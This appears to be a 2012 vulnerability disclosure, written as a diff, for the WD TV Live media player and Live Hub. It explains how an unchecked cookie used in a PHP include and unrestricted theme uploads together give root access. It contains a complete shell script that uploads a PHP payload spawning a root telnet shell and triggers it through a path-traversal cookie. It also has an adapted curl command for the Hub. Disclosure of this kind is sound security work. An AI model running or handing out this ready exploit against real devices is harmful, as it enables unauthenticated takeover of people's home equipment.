@@ -1,0 +1,111 @@
+Introduction
+============
+The WD TV Live Streaming Media Player is a consumer device to play 
+various audio and video formats.
+Additionally it allows access to multiple video streaming services like 
+Netflix, Hulu or Youtube.[1]
+The device allows customization of its user interface and limited remote 
+administration using a web interface.
+
+The LIVE SMP is running a customized Linux kernel and userland.
+Parts of the firmware are released under the terms of the GNU General 
+Public License.
+Proprietary binaries are included in encrypted parts of the firmware 
+which are decrypted during runtime.
+
+1. Affected Versions
+--------------------
+The analysed firmware is the latest version (1.07.15 as of 03/2012) as 
+published on [2], prior versions are vulnerable too.
+Large portions of the firmware are shared with the WDTV Live Hub[3] thus 
+the presented findings are applyable on this device with minor changes 
+as described later.
+
+2. Attack Vector
+----------------
+The attack vector used to gain root access on the device involves two 
+implementation flaws as described in the following sections.
+
+2.1. User Input Validation Flaws
+--------------------------------
+The web interface is written using the PHP language.
+Several files contain user input validation flaws similar to the one 
+described here.
+Cookie header values in /opt/webserver/htdocs/index.php are not 
+validated at all.
+The provided cookie value is used within an include statement allowing 
+the attacker to force inclusion of arbitrary files (as long as they are 
+named home.php).
+
+2.2. Possibility to Upload Arbitrary Files
+------------------------------------------
+To allow the customization of the user interface one may upload theme 
+files (zip archives) through the web interface.
+The contents of these archives are not restricted so adding a file named 
+home.php is possible.
+
+2.3. Limitations
+----------------
+Most of the PHP files of the web interface include security.php which 
+limits access to the networks IP/subnet mask combination the LIVE SMP is 
+connected to.
+Aformended index.php is guarded by this security measure but uploading 
+theme file using upload.php is possible from any IP address.
+
+3. Proof of Concept
+-------------------
+The following script will spawn a telnet daemon providing access to a 
+root shell on the device.
+(needs zip and curl binaries)
+
+#!/bin/sh
+THEME_NAME="blub"
+
+if [ $# != 1 ]; then
+  TARGET="orpheus"
+  echo "Root Exploit for WDTV Live SMP\n\nUsing default 
+target=${TARGET}\nUSAGE: $0 <target>\n\n"
+else
+  TARGET=$1
+fi
+
+if [ ! -f "home.php" ]; then
+  echo '<?php system("telnetd -l /bin/sh");print "\nUnd es hat blub 
+gemacht.\n\n";exit();' > home.php
+fi
+
+if [ ! -f "${THEME_NAME}.zip" ]; then
+  touch meta.xml
+  zip ${THEME_NAME} home.php meta.xml
+fi
+
+echo "Uploading ${THEME_NAME}.zip:"
+curl -F appearance= () ${THEME_NAME} zip -o /dev/null \
+  http://${TARGET}/upload.php
+
+echo "\n\nRunning payload:"
+curl --cookie "language=../../../../usrdata/.wd_tv/theme/${THEME_NAME}" \
+  http://${TARGET}/index.php
+
+4. Adaption for the Live Hub
+----------------------------
+As the LIVE HUB does not have the ability to upload themes through the 
+web interface, one needs to use a different angle to upload the payload:
+Using the samba share WDTVLiveHub. Thus the language cookie has to be 
+adapted as shown here:
+
+curl --cookie "language=../../../../mediaitems/Local/WDTVLiveHub/" \
+  http://${TARGET}/index.php
+
+5. Code, Whitepaper, Example Session, References
+------------------------------------------------
+Code, whitepaper, example session: http://hammerhead.shark23.de
+
+[1] Western Digital. WD TV Live, .
+URL http://wdc.com/en/products/products.aspx?id=330.
+[2] Western Digital. Downloads WD TV Live Streaming Media Player (Gen 
+3), 2012.
+URL 
+http://support.wdc.com/product/download.asp?groupid=1011&sid=161&lang=en.
+[3] Western Digital. WD TV Live Hub, .
+URL http://wdc.com/en/products/products.aspx?id=570.
